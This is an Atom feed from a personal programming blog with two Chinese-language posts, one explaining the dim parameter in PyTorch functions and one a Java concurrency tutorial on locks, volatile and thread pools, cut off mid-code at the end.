<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SJTU-XHW&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/775cd43db6a8785d6a482dcf308b3be4</icon>
  <subtitle>It&#39;s better to burn out than to fade away.</subtitle>
  <link href="https://blog.sjtuxhw.top/atom.xml" rel="self"/>
  
  <link href="https://blog.sjtuxhw.top/"/>
  <updated>2025-02-28T12:42:57.462Z</updated>
  <id>https://blog.sjtuxhw.top/</id>
  
  <author>
    <name>SJTU-XHW</name>
    <email>sjtuxhw12345@sjtu.edu.cn</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>如何理解 PyTorch 函数的 dim 参数</title>
    <link href="https://blog.sjtuxhw.top/technical/pytorch-dim/"/>
    <id>https://blog.sjtuxhw.top/technical/pytorch-dim/</id>
    <published>2025-02-18T12:17:05.000Z</published>
    <updated>2025-02-28T12:42:57.462Z</updated>
    
    <content type="html"><![CDATA[<p>之前很长的一段时间内，我都不太清楚如何感性地理解 PyTorch 中的 <code>dim</code> 参数。最近琢磨到了一个还算比较好理解的方法，故简单记录在这里。</p><p><code>dim</code> 在 PyTorch 的很多函数中都可以指定，例如 <code>sum / mode / unsqueeze / topk</code> 等等，主要是告诉函数应该针对张量的哪个特定维度操作。</p><p>这在输入张量维度很高的时候就不那么直观了。虽说不理解问题不大，最多手写循环就能达到目的。但如果我们想尽量避免使用 python 的显式循环，或者还想要利用广播机制来更快的完成计算任务，就不得不总结一下了。</p><ul><li><p><strong><u>聚合类函数</u></strong>（<strong><u>减小维度数的运算</u></strong>，reduction operations），例如 <code>sum / mean / max / min / mode / topk</code> 等等；</p><ul><li><p><code>dim</code> 通常的语义是 “沿这个维度进行消除”，如果有指定 <code>keepdim=True</code>，则这个维度 size 压缩为 1；</p></li><li><p><code>dim</code> 的值就对应张量 shape 的索引；</p></li><li><p>被操作的每个元素的 shape 就是 原张量的 shape 在 <code>dim</code> 索引之后组成的新的 shape，即 <code>shape[dim+1:]</code>；</p></li></ul><blockquote><p>例如对于 <code>a = torch.tensor([ [ [[1],[2],[3]], [[2],[3],[4]] ], [ [[3],[4],[5]], [[4],[5],[6]] ] ])</code>，它的 shape 是 <code>(2, 2, 3, 1)</code>；</p><p>tips. <strong><u>对于高维张量的形状，请从外向里读，这样更清楚一点</u></strong>；</p><p>那么 <code>sum(a, dim=2)</code> 的含义就是沿着 size 为 3 的维度（shape 索引是 2）相加，被求和的元素的 shape 就是原 shape 中索引为 2 向后的组成的。不难发现 size 为 3 的维度的元素是 shape 是 <code>(1,)</code> 的子元素，把子元素加起来就行，答案应该是 <code>[ [ [[6]], [[9]] ], [ [[12]], [[15]] ] ]</code>；</p><p>再来个简单的：<code>b = torch.tensor([[1,2,3], [4,5,6]])</code>，这个 <code>(2,3)</code> 的张量是不是就非常清楚了？我们计算 <code>sum(b, dim=0)</code> 就是对 size 为 2 的维度求和，也就是元素是 shape <code>(3,)</code> 的张量求和，答案显然是 <code>[[5,7,9]]</code>；</p></blockquote></li><li><p><strong><u>拼接类函数</u></strong>（<strong><u>不改变维度数的运算</u></strong>），例如 <code>cat</code> 等，<code>dim</code> 通常的语义是 “拼接的方向”；</p><ul><li>“拼接的方向” 是指，拼接后 size 有变化的维度；例如 <code>a = torch.zeros(2, 3); b = torch.zeros(2, 4)</code>，<code>torch.cat([a,b], dim=1)</code> 就是让行对齐、列增大的拼接方式；</li><li>拼接得到的张量的 shape 和原张量的 shape 的维度数相同，只是某个维度上的 size 有所不同；</li></ul></li><li><p><strong><u>扩展类函数</u></strong>（<strong><u>增加维度数的运算</u></strong>，expansion operations），例如 <code>unsqueeze / stack</code> 等，<code>dim</code> 通常的语义是在原张量的指定维度下添加 size 为 N ($N\ge1$) 的维度；</p><ul><li><p>对于 <code>unsqueeze</code>，没有向张量引入其他信息，只是在原张量 shape 索引为 <code>dim</code> 的位置插入 1 来扩展；</p></li><li><p>比较难以理解的是 <code>stack</code>，很多人会把 <code>stack</code> 和 <code>cat</code> 的作用搞混。但我们只需要搞清楚本质上 <code>stack</code> 是维度扩展类函数，而 <code>cat</code> 则是拼接类函数，就行了！<code>cat</code> 不改变张量的维度，只是将两个或以上张量在已有维度上拼接；而 <code>stack</code> 则是通过新增一个维度来连接两个张量。</p><p>像 <code>a = torch.zeros(2,3); b = torch.ones(2,3)</code>，如果执行 <code>torch.stack([a,b], dim=2)</code>，则是在原张量 shape 为 <code>(2,3)</code> 的情况下构造一个 shape 为 <code>(2,3,2)</code> 的新张量（在 shape 索引为 <code>dim=2</code> 的位置插入一个 size=2 的维度，分别装 <code>a</code> 和 <code>b</code>）。至于最终如何表示输出的张量，很简单，就是在第三个维度把两个张量排在一起，这么表示：<code>[[[0, 1], [0, 1], [0, 1]], [[0, 1], [0, 1], [0, 1]]]</code>，还好只有 3 维，我们可以感性地画出来：</p><p><img src="imgs/pth_stack.jpg" width="450px" /></p></li></ul></li></ul><p>综上，在维度很高、没法感性理解的时候，可以尝试列出输入的 shape（从外向内读），然后在你要执行的函数中指定 <code>dim</code>，按规则写出输出的 shape，你就能清楚这个操作究竟在做什么了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前很长的一段时间内，我都不太清楚如何感性地理解 PyTorch 中的 &lt;code&gt;dim&lt;/code&gt; 参数。最近琢磨到了一个还算比较好理解的方法，故简单记录在这里。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dim&lt;/code&gt; 在 PyTorch 的很多函数中都可以指定，例如 &lt;co</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="AI" scheme="https://blog.sjtuxhw.top/tags/AI/"/>
    
    <category term="ML" scheme="https://blog.sjtuxhw.top/tags/ML/"/>
    
    <category term="PyTorch" scheme="https://blog.sjtuxhw.top/tags/PyTorch/"/>
    
  </entry>
  
  <entry>
    <title>Java 进阶（三）：垃圾回收、并发、JDNI &amp; SPI</title>
    <link href="https://blog.sjtuxhw.top/technical/java-adv-3/"/>
    <id>https://blog.sjtuxhw.top/technical/java-adv-3/</id>
    <published>2025-01-06T05:44:06.000Z</published>
    <updated>2025-01-18T15:03:54.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-7-Java-Concurrent"><a href="#Chapter-7-Java-Concurrent" class="headerlink" title="Chapter 7. Java Concurrent"></a>Chapter 7. Java Concurrent</h1><h2 id="7-1-Usage"><a href="#7-1-Usage" class="headerlink" title="7.1 Usage"></a>7.1 Usage</h2><p>读者回忆一下在计算机系统课程中学习的关于 thread 和 process 的知识，最好能够在心中对比一下在 C/C++ 中使用线程和进程。</p><p>我们本节的目的是在 Java 中使用线程。两种方法：</p><ul><li>使用 <code>Runnable</code> Interface：<ol><li>重写 <code>public void run()</code> 方法；</li><li>将这个类的实例作为 <code>Thread</code>  类型的构造参数。构造完成后启动 <code>Thread#start()</code> 即可；</li></ol></li><li>继承于 <code>Thread</code> Class；<ol><li>重写 <code>public void run()</code> 方法；</li><li>直接启动：<code>Thread#start()</code>；</li></ol></li></ul><p>注意，我们需要特别处理 <code>InterruptedException</code>：</p><ul><li><p>Java 多线程程序中，我们应该总是考虑这种 exception。这意味着外部有人正在希望以一种优雅的方式结束当前线程（就是对当前线程对象 <code>Thread#interrupt()</code>），并且可能正在通过 <code>Thread#join()</code> 等待；</p></li><li><p>不应该在捕获这个异常的时候直接抛出另外一种异常（混淆原因），或者直接忽略（外部线程可能正在等待结束！）；</p></li><li><p>根据方法自身的含义，一般有两种解决方案：</p><ol><li>继续向上传播这个异常（当你的方法本身就是一个耗时操作 / 网络操作或者其他情况）；</li><li>捕获这个异常、设置当前线程被 interrupted 的 flag（方便 log 溯源）：<code>Thread.currentThread.interrupt()</code>，并且准备结束；</li></ol><p>然后处理当前类中需要回收 / 处理的资源。无论是哪一种方法，都需要遵循当前方法的语义：“调用它出现 <code>InterruptException</code> 这种情况是否合理？”</p></li></ul><h2 id="7-2-Synchronized-Methods"><a href="#7-2-Synchronized-Methods" class="headerlink" title="7.2 Synchronized Methods"></a>7.2 Synchronized Methods</h2><p>Java 线程中的设定和 C/C++ 是类似的，它也会共享线程间的资源，不过 Java 没有指针，只是通过引用共享的。因此会遇到和 C/C++ 一样的问题。</p><p>就以共享静态变量为例，多线程同时操作共享静态变量会导致未定义的行为（race condition）。</p><p>在 C/C++ 中，一般会通过设立临界区（信号量 semaphore）或互斥锁（mutex）来锁定共享变量，确保同一时间只有一个/指定数量的线程可以访问。</p><p>在 Java 中，提供了一种修饰方法的关键字 <code>synchronized</code>，其作用是：</p><ol><li><p>被该关键字修饰的方法，其所在的类型的任意一个对象，只能被一个线程调用被这个关键字修饰的方法。</p><p>也就是说，相当于在这个方法的类上设一个互斥锁（被称为 intrinsic lock 固有锁，或者 monitor lock），把这个类中所有被 <code>synchroized</code> 修饰的方法锁住；</p></li><li><p>当一个线程退出了一个对象的 synchronized 方法，则会与这个对象其他的 synchronized 方法建立一个 happens-before relationship，以确保对象被使用的状态能被所有线程知道；</p></li></ol><p>如果 <code>synchronized</code> 修饰在静态方法上，那么锁住的就是与 intrinsic lock 关联的 class 实例，而不是它的实例的实例。也就是对这个类中静态域的访问会被控制，需要与实例方法的 <code>synchronized</code> 区分开。</p><p>Java 甚至支持到 statement 细粒度的 <code>synchronized</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里保护实例属性的并发访问（this）</span></span><br><span class="line">    <span class="comment">// 如果需要保护静态成员，则需要将关键字定义在静态方法上</span></span><br><span class="line">    <span class="comment">// 或者括号内使用 Class 元类型的实例</span></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        lastName = name;</span><br><span class="line">        nameCount++; </span><br><span class="line">    &#125; </span><br><span class="line">    nameList.add(name); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-3-Reentrant-Synchronization"><a href="#7-3-Reentrant-Synchronization" class="headerlink" title="7.3 Reentrant Synchronization"></a>7.3 Reentrant Synchronization</h2><p>Java 中提供了一类可重入锁，可以让获得锁的同一个线程多次访问临界资源：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意，如果需要保护类的静态成员，则应该将锁也定义为静态成员</span></span><br><span class="line"><span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//更新对象状态</span></span><br><span class="line">    <span class="comment">//捕获异常，并在必须时恢复不变性条件</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">   e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">   lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-4-Atomic-Access-amp-Keyword-volatile"><a href="#7-4-Atomic-Access-amp-Keyword-volatile" class="headerlink" title="7.4 Atomic Access &amp; Keyword volatile"></a>7.4 Atomic Access &amp; Keyword <code>volatile</code></h2><p>Java 中原生的单步原子访问操作包含：</p><ul><li><p>针对引用变量的读写、大多数基本类型的读 <strong><u>或</u></strong> 写（除了 <code>long</code> / <code>double</code>）；</p></li><li><p>被 <code>volatile</code> 关键字修饰的所有变量的读 <strong><u>或</u></strong> 写（包括 <code>long</code> 和 <code>double</code>）；</p><blockquote><p><code>volatile</code> 的本质是，程序在访问一个被它修饰的变量后，会<strong><u>直接进入 main memory 读取，而不会使用寄存器 / 线程本地缓存</u></strong>；相当于告诉 JVM 这个变量可能会在当前线程的控制流以外的地方被更改。</p><p>它会确保当一个线程修改了一个变量时，其他线程能够立即看到这个修改。</p><p>底层是通过<u>禁止指令重排序和 memory barrier（如 x86-64 的 <code>fence</code> 族指令）</u> 等机制来实现的。</p></blockquote></li></ul><p>Java 的原子访问操作可以：</p><ul><li>保证多线程操作一个数据时值不会错误的改变（写操作字节码指令会一次性执行完），降低 memory inconsistency 的风险；</li><li>保证各个线程总是能读到关于这个值最新情况（读操作字节码指令会读到最新的情况并且一次性执行完）；</li></ul><p>那么，<strong><u>为什么 Java 既然有内置 <code>Atomic</code> Classes、锁、synchronous 关键字等等同步机制，为什么还需要 volatile 关键字</u></strong>？</p><p>问出这个问题就说明你将 “多线程原子操作”（也称 “同步”）和这里的 “单步原子访问操作” 的概念混淆了。</p><ul><li>单步原子操作是指，Java 中的一条基本字节码指令（例如读一次内存、写一次内存）会不会被 CPU（其他线程）从中间打断、打乱；</li><li>多线程原子操作通常讨论的是一条/一系列 Java 代码的执行（例如从获取内存中的共享变量值到自增写回的这个流程）会不会被 CPU（其他线程）从中间打断；</li></ul><p>我们发现，满足单步原子访问操作是满足多线程原子操作的<u>必要不充分条件</u>。因此底层在实现多线程同步机制时，一定已经实现了单步原子访问的操作（及时刷到内存中）。</p><p>单步的原子操作是<strong><u>由语言本身以及硬件指令的特征决定</u></strong>。在 Java 中，为了保证灵活性还向上提供了 <code>volatile</code> 关键字，相当于告诉 JVM 和 CPU，被它修饰的变量一是不能放在寄存器中/缓存下来，二是它需要满足单步原子操作（不能乱序执行）。</p><p><img src="imgs/volatile.png" width="350px" /></p><p>而多线程原子操作则需要开发者按照程序语义，利用同步机制手动指定代码片段的临界区，即同一时刻的访问控制。</p><p>总结一下，你只需要记住这些：</p><ul><li><code>volatile</code> 保证 Java 多线程对某个变量的读、写是及时的（不使用寄存器、不使用线程缓存、禁止指令乱序），一定能被下一条指令 / 其他线程感知到；</li><li>其他的同步操作，保证 Java 代码片段执行期间的临界特性（不会有另一个线程同时执行相同代码）；</li><li>为共享变量加锁（或者其他同步机制）之后，就不再需要 <code>volatile</code> 关键字了（后者是前者的必要不充分条件）；</li></ul><p>因此，只有在<u>没有多线程同步的需求</u>（<code>volatile</code> 不保证同一线程对变量的一系列操作是原子的），但是又要保证对某一个变量的读和写是准确、及时的时候，可以使用 <code>volatile</code> 关键字，例如状态标志、简单的布尔变量等，这样不需要加锁，规避了死锁以及性能问题。</p><blockquote><p>注意：C/C++ 中的 <code>volatile</code> 关键字的含义与 Java 有些差异。</p><p>它只是告诉 Compiler 不要优化被修饰的变量，并且把它放在内存中，每次读写都直接对内存操作。常用在嵌入式 / 绕过编译器进行内存映射等场景中。</p><p>这里没有单步原子操作的说法，因为 C/C++ 编译结束后直接就是机器码。</p></blockquote><h2 id="7-5-Dead-Lock-Starvation-Live-Lock"><a href="#7-5-Dead-Lock-Starvation-Live-Lock" class="headerlink" title="7.5 Dead Lock, Starvation, Live Lock"></a>7.5 Dead Lock, Starvation, Live Lock</h2><p>无论是死锁还是活锁，都是指多个线程之间因互相请求访问资源而导致程序无法继续执行的情况。</p><p>它们的不同点是：</p><p>对于死锁，它发生的情况是多个线程或进程在互相等待对方释放资源时，自己又不会主动释放自己占有的资源，导致程序永远无法继续的情况。</p><blockquote><p>例如，假设一个程序的两个线程 A 和 B，A 先获得了一个资源 X 并给它上锁，B 获得了另一个资源 Y 也给它上了锁。但是接下来 B 需要资源 X 才能继续、A 又需要 Y 才能继续。所以二者相互等待对方释放资源锁，造成了死锁；</p></blockquote><p>对于活锁，线程并不会阻塞在原地，而是反复地在释放资源和获取资源间横跳，这主要是因为程序有处理资源访问冲突的机制，但是两个存在活锁的线程相互处理访问冲突的时候又造成了访问冲突，也无法继续下去。</p><blockquote><p>例如一个程序的线程 A 和 B，假设 A 先获得了一个资源 X 并给它上锁，B 获得了另一个资源 Y 也给它上了锁。A 想要获取资源 Y 的时候发现 B 占用了，于是 A 主动释放了资源 X 给 B，自己去获取资源 Y；但是此时 B 也主动释放了 Y 资源，去获取 X 资源，双方只是调换了资源持有的顺序，仍然无法继续执行。</p></blockquote><p>线程饥饿是指，因为共享资源调度策略的问题，造成某些线程一直无法获得执行的机会而近乎停止执行，而另一些线程则一直占用共享资源不释放。</p><h2 id="7-6-Condition-Variable-in-Java-Guarded-Blocks"><a href="#7-6-Condition-Variable-in-Java-Guarded-Blocks" class="headerlink" title="7.6 Condition Variable in Java: Guarded Blocks"></a>7.6 Condition Variable in Java: Guarded Blocks</h2><p>在 Java 中，和 C/C++ 的 condition variable 对应的、在 blocks 前通过某些方式检查（例如轮询）一些条件再决定执行的，线程动作同步的术语被称为 guarded block。</p><p>Java 中被 <code>synchrounous</code> 修饰的方法可用 <code>Object#wait()</code> 和 <code>Object#notify*() / notifyAll()</code> 来实现与 condition variable 相似的效果。</p><ul><li><code>Object#wait()</code>：此时会设置等待的信息、放锁并且挂起当前线程（不是 spin lock）；</li><li><code>Object#notify / notifyAll()</code>：另一个线程可以通过访问当前对象的这两个方法来唤醒等待在 intrinsic lock 上的线程，把锁交给它们；</li></ul><p>我们可以利用 guarded blocks 模仿 condition variable 的做法实现生产者消费者模式。</p><h2 id="7-7-Immutable-Objects"><a href="#7-7-Immutable-Objects" class="headerlink" title="7.7 Immutable Objects"></a>7.7 Immutable Objects</h2><p>在很多实际情况下，不可变数据类型的好处：</p><ul><li><p>复制构造时，不是引用传递，因此是深拷贝。这样使用起来和基本类型一样方便，但是又不用担心改错源数据（非引用链接）；</p></li><li><p>确保数据在多线程情况下无需同步，线程安全！</p></li></ul><p>我们在 Java Bean &amp; Record 一节已经讨论过。不可变类的定义：一个类满足如下三个条件：</p><ul><li>类型中的每个数据域都是 <u>私有的、常量的</u>（<code>private</code>，<code>final</code>）；</li><li>每个数据域都只能通过 <code>getter</code> 方法获取，不能有任何 <code>setter</code> 方法，并且没有“返回值是指向可变数据域的引用”的 <code>getter</code> 方法；</li><li>必须存在公有构造函数，并且构造函数内初始化各个数据域（常量只能这么做）；</li><li>Object 基类继承函数 <code>equals</code> 返回 <code>true</code> 当且仅当类中的每个数据域都相等；</li><li>Object 基类继承函数 <code>hashCode</code> 在类中的每个数据域都相等时，一定返回一样的值；</li><li>Object 基类继承函数 <code>toString</code> 最好包含 类名 和 每个数据域的名称和值； </li></ul><p><strong>因此如果有一个类数据域都私有、没有修改器方法，但有一个方法：返回内部一个可变数据域的引用（例如数组），则这个类也是可变类</strong>；</p><h2 id="7-8-High-Level-Concurrency-Objects"><a href="#7-8-High-Level-Concurrency-Objects" class="headerlink" title="7.8 High Level Concurrency Objects"></a>7.8 High Level Concurrency Objects</h2><p>Java 中包装了一些高级并发对象：</p><h3 id="7-8-1-Lock-Objects"><a href="#7-8-1-Lock-Objects" class="headerlink" title="7.8.1 Lock Objects"></a>7.8.1 Lock Objects</h3><p>Lock Objects：对常见的并发场景提供了简单的保护；</p><blockquote><p>例如 <code>ReentrantLock</code>（可重入锁），</p><p>可以使用 <code>tryLock()</code> 获取锁、<code>unlock()</code> 释放锁。</p><p>和 Intrinsic Lock 机制很相似（包括持有规则、通过关联的 Condition 对象 notify/wait）相比更好的一点是 “允许 try”，也就是获取锁不成功的话还可以回到获取锁前的执行状态。</p></blockquote><h3 id="7-8-2-Executors"><a href="#7-8-2-Executors" class="headerlink" title="7.8.2 Executors"></a>7.8.2 Executors</h3><blockquote><p>创建一个新的线程可以通过继承 Thread 类或者实现 Runnable 接口来实现，这两种方式创建的线程在运行结束后会被虚拟机销毁，进行垃圾回收，如果线程数量过多，频繁的创建和销毁线程会浪费资源，降低效率。而线程池的引入就很好解决了上述问题，线程池可以更好的创建、维护、管理线程的生命周期，做到复用，提高资源的使用效率，也避免了开发人员滥用 new 关键字创建线程的不规范行为。</p><p>在实际生产中，一般企业内部会规定编码规范。例如 Aliyun 指出，线程资源必须通过线程池提供，不允许在应用中显式的创建线程。如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。</p></blockquote><p>Executors：为启动、管理线程提供了更高级的 API，可以使用线程池机制为大规模并发应用提供支持；</p><p>将线程创建、管理的工作从应用业务逻辑中剥离。Java 中的 Executor 就是来包装这个的接口。</p><p>其中，有一些框架 / 库可以实现 Executor 接口。例如：</p><ul><li>Thread Pools：线程池，最常见的对于 Executor 的 implementation；</li><li>Fork/Join：一个利用多处理器资源的 Executor 实现框架。</li></ul><p><code>Executor</code> 接口只有一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(java.lang.Runnable runnable)</span>;</span><br></pre></td></tr></table></figure><p>不需要自行创建 <code>Thread</code>，而是将 Runnable 类放到 Executor 中，让它帮你启动和管理。</p><p>类似地，还有 <code>ExecutorService</code> 接口，提供了比 <code>Executor</code> 更灵活的线程提交方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ExecutorService</span> <span class="keyword">extends</span> <span class="title class_">java</span>.util.concurrent.Executor, java.lang.AutoCloseable;</span><br></pre></td></tr></table></figure><p>类似 <code>Executor</code>，不过它不仅仅允许你提交 <code>Runnable</code> 对象，还允许使用 <code>Callable</code>，并使用 <code>Future&lt;T&gt;</code> 来异步获取返回值，可以通过返回的 <code>Future</code> 对象了解、管理 Runnable/Callable 的执行状态：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Future&lt;?&gt; submit(Runnable runnable);</span><br><span class="line">Future&lt;T&gt; <span class="title function_">submit</span><span class="params">(Runnable runnable, T t)</span>;</span><br><span class="line">Future&lt;T&gt; <span class="title function_">submit</span><span class="params">(Callable&lt;T&gt; callable)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时启动多个 callable 对象</span></span><br><span class="line">List&lt;Future&lt;T&gt;&gt; <span class="title function_">invokeAll</span><span class="params">(Collection&lt;? extends Callable&lt;T&gt;&gt; collection)</span> <span class="keyword">throws</span> InterruptedException;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 等待终止</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">awaitTermination</span><span class="params">(<span class="type">long</span> l, TimeUnit timeUnit)</span> <span class="keyword">throws</span> InterruptedException;</span><br></pre></td></tr></table></figure><p>在 <code>ExecutorService</code> 基础上继续包装 <code>ScheduledExecutorService</code>，允许对线程启动提供调度 delay 的时间：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ScheduledFuture&lt;V&gt; <span class="title function_">schedule</span><span class="params">(Callable&lt;V&gt; callable, <span class="type">long</span> l, TimeUnit timeUnit)</span>;</span><br><span class="line">ScheduledFuture&lt;?&gt; schedule(Runnable runnable, <span class="type">long</span> l, TimeUnit timeUnit);</span><br></pre></td></tr></table></figure><h4 id="A-Implementation-ThreadPoolExecutor"><a href="#A-Implementation-ThreadPoolExecutor" class="headerlink" title="A. Implementation: ThreadPoolExecutor"></a>A. Implementation: <code>ThreadPoolExecutor</code></h4><p>Thread Pool 线程池，是 <code>Executor</code> 的一种实现，用的最多的是 <code>ThreadPoolExecutor</code> 类型。</p><ul><li><p><code>ThreadPoolExecutor</code> 类型继承：</p><p><img src="imgs/concurrent-executor-hier.png" width="350px" /></p></li><li><p><code>ThreadPoolExecutor</code> 状态维护：运行状态 (<code>runState</code>) 和线程数量 (<code>workerCount</code>) 放在同一个 Atomic Integer 中，高 3 位保存 <code>runState</code>，低 29 位保存 <code>workerCount</code>，二者同时取出避免数据不一致或者频繁占用锁资源。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AtomicInteger</span> <span class="variable">ctl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(ctlOf(RUNNING, <span class="number">0</span>));</span><br></pre></td></tr></table></figure></li><li><p><code>runState</code>：共有 5 种：</p><p>| 运行状态   | 状态描述                                                     |<br>| ————— | —————————————————————————————— |<br>| RUNNING    | 运行状态。能接收新提交的任务，也能处理阻塞队列中的任务       |<br>| SHUTDOWN   | 准备关闭状态。不接受新提交的任务，但能处理阻塞队列中的任务   |<br>| STOP       | 停止状态。所有正在执行的任务会被终止，不接受新提交任务、队列中存在的任务 |<br>| TIDYING    | 空闲状态。所有任务都已经结束，并且当前有效线程数（<code>workerCount</code>）为 0 |<br>| TERMINATED | 终止状态。在空闲状态下才能终止，标识不再使用                 |</p><p><img src="imgs/concurrent-tpe-runstate.png" width="550px" /></p></li><li><p><code>execute</code> Control Flow：</p><ol><li>首先检测线程池运行状态，如果不是 <code>RUNNING</code>，则直接拒绝；</li><li>如果 <code>workerCount &lt; corePoolSize</code>，则创建并启动一个线程来执行新提交的任务；</li><li>如果 <code>workerCount &gt;= corePoolSize</code>，且线程池内的阻塞队列未满，则将任务添加到该阻塞队列中；</li><li>如果 <code>workerCount &gt;= corePoolSize &amp;&amp; workerCount &lt; maximumPoolSize</code>，且线程池内的阻塞队列已满，则创建并启动一个线程来执行新提交的任务；</li><li>如果 <code>workerCount &gt;= maximumPoolSize</code>，并且线程池内的阻塞队列已满，则根据拒绝策略来处理该任务，默认的处理方式是直接抛异常。</li></ol></li><li><p>拒绝策略（饱和策略）：</p><ul><li><strong><code>AbortPolicy</code></strong>：默认策略，抛出异常 <code>RejectedExecutionException</code>，拒绝执行；</li><li><strong><code>CallerRunsPolicy</code></strong>：调用执行自己的线程运行任务，也就是直接在调用 <code>execute</code> 方法的线程中运行 (run) 被拒绝的任务，如果执行程序已关闭，则会丢弃该任务。因此这种策略会降低对于新任务提交速度，影响程序的整体性能。如果您的应用程序可以承受此延迟并且要求任何一个任务请求都要被执行的话，你可以选择这个策略；</li><li><strong><code>DiscardPolicy</code></strong>：不处理新任务，直接丢弃掉；</li><li><strong><code>DiscardOldestPolicy</code></strong>：此策略将丢弃最早的未处理的任务请求。</li></ul></li></ul><p>使用 <code>ThreadPoolExecutor</code> 一般配合 fixed thread pool 的策略。好处是可以让应用 degraded gracefully。</p><p>不过 <code>Executor</code> 本身也提供了一些快速创建的工厂方法，帮助在一些场景下简化代码逻辑：</p><ul><li><p>使用 <code>newFixedThreadPool</code> 创建固定的线程数的线程池（同时最多只有指定的线程数正在执行）；</p></li><li><p>使用 <code>newSingleThreadExecutor</code> 单个线程实例的 executor，一次执行一个线程；</p></li><li><p>使用 <code>newCachedThreadPool</code> 创建可动态调整线程数的线程池，可以应对多个短期 tasks；</p><blockquote><p>创建一个可缓存的线程池，调用 <code>execute</code> 将重用以前构造的线程（如果线程可用）。如果没有可用的线程，则创建一个新线程并添加到池中。终止并从缓存中移除那些已有 60 秒钟未被使用的线程；</p></blockquote></li><li><p><code>newScheduledThreadPool</code> 创建一个支持定时及周期性的任务执行的线程池，多数情况下可用来替代 Timer 类；</p></li></ul><blockquote><p>[!WARNING]</p><p>但是在实际生产实践中，我们不建议使用 <code>Executors</code> 来创建线程池。建议使用 <code>ThreadPoolExecutor</code> 构造函数的方式，因为后者的处理方式让开发者更加明确线程池的运行规则，规避资源耗尽的风险。</p><p>再强调一次。项目中创建多线程时，使用上面的方法线程池创建方式，无论是单一、可变、定长都有一定问题，原因是：</p><ul><li><code>FixedThreadPool</code> 和 <code>SingleThreadExecutor</code> 底层使用有界阻塞队列 <code>LinkedBlockingQueue</code>；</li><li><code>CachedThreadPool</code>：底层使用的是同步队列 <code>SynchronousQueue</code>；</li><li><code>ScheduledThreadPool</code> 和 <code>SingleThreadScheduledExecutor</code>：使用的无界的延迟阻塞队列<code>DelayedWorkQueue</code>；</li></ul><p>这些队列的最大长度为都是 <code>Integer.MAX_VALUE</code>，可能会堆积大量请求导致 OOM（为什么<strong><u>网络请求场景下，队列越长越有可能 OOM</u></strong>，请参见 “计算机系统工程 - 拥塞控制”）。</p></blockquote><p>所以实际生产环境中开发者会根据需求手动定制 <code>ThreadPoolExecutor</code> 的 7 个参数，来自定义线程池。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程池的核心线程数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">corePoolSize</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"><span class="comment">// 能容纳的最大线程数</span></span><br><span class="line"><span class="keyword">private</span> <span 